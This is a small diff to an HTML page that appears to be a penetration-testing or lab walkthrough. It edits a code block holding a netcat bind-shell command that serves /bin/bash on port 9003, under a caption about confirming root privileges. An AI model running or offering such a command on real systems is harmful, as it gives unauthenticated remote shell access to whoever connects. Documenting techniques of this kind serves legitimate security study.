@@ -119,7 +119,7 @@
 
 <p>Checked user ID to confirm root privileges:</p>
 
-<pre><code>nohup nc -nlvp 9003 -e /bin/bash &</code></pre>
+<pre><code>nc -nlvp 9003 -e /bin/bash &</code></pre>
 
 <pre><code>id</code></pre>
 
